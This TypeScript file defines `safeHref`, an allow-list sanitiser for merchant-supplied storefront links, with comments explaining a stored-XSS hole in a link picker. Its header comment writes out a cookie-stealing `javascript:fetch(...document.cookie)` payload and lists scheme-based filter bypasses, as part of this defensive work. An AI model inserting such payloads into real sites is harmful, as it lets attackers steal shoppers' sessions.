// The ONE place a merchant-supplied link becomes an `href`.
//
// WHY THIS EXISTS. The Store Builder's link picker (`apps/admin/components/theme/link-picker.tsx`)
// has a free-text URL tab that accepts whatever is typed, `saveTemplate` validates nothing, and the
// value lands directly in `<a href={...}>` in five section components. Astro escapes an attribute's
// QUOTES — it does not care what SCHEME the URL uses — so `javascript:fetch('…'+document.cookie)`
// pasted into that box becomes a working script on the merchant's own storefront, running in the
// shopper's session on the shop's origin.
//
// Today `theme:write` is owner/admin-only, so it is self-XSS against the merchant's own shop. That is
// not a reason to leave it: it is already a stored-XSS vector aimed at that store's SHOPPERS, and it
// becomes a cross-privilege hole the moment `theme:write` widens by one role.
//
// ⚠️ **Sanitise at the RENDER site, not in the picker.** The picker is UX — a second entry point (an
// import, a seed, a future API, a direct DB write) reaches the same `<a>` without passing through it.
// The rule belongs where the string becomes markup.
//
// An ALLOW-LIST, never a block-list of "javascript:". Block-lists lose: `JaVaScRiPt:`, a leading
// control character, `java\tscript:`, `data:text/html`, `vbscript:` — the browser is far more
// forgiving about what it will parse as a scheme than any regex is about matching it.

// Schemes a merchant may link to. Deliberately SHORT: this repo reaches WhatsApp over `https://wa.me/…`
// (see Chat.astro / waLink), so there is no `whatsapp:` here — an allow-list entry nothing uses is a
// hole nobody is watching.
const ALLOWED = ["http:", "https:", "mailto:", "tel:"];

/**
 * A merchant-supplied link, made safe to render.
 *
 * Returns `undefined` for anything not allowed, so the caller can drop the attribute entirely rather
 * than emit `href=""` — an empty href re-loads the current page, which reads as a broken button.
 *
 * Site-relative links (`/kategori/dress`, `#bagian`, `?sort=terbaru`) are the normal case and pass
 * straight through. Protocol-relative (`//evil.tld`) is REJECTED: it looks relative and is not.
 */
export function safeHref(raw: string | null | undefined): string | undefined {
  if (!raw) return undefined;
  // Strip the C0 range + space: `javascript:` and `java\tscript:` are parsed as schemes by
  // browsers but defeat a naive `startsWith("javascript:")` test.
  const url = raw.trim().replace(/[\u0000-\u0020]/g, "");
  if (!url) return undefined;

  // Site-relative and in-page links: safe by construction, and the overwhelmingly common case.
  // `//` is excluded deliberately — it is protocol-relative, i.e. another origin wearing a slash.
  if (url.startsWith("/") && !url.startsWith("//")) return url;
  if (url.startsWith("#") || url.startsWith("?")) return url;

  // Anything else must parse AND carry an allow-listed scheme. `URL` does the scheme parsing for us,
  // including the case-folding and the whitespace rules a hand-rolled regex gets wrong.
  try {
    return ALLOWED.includes(new URL(url).protocol) ? url : undefined;
  } catch {
    // Not a URL at all (bare text like "dress"). Refuse rather than guess a prefix: guessing is how
    // a typo becomes a 404 the merchant never sees.
    return undefined;
  }
}
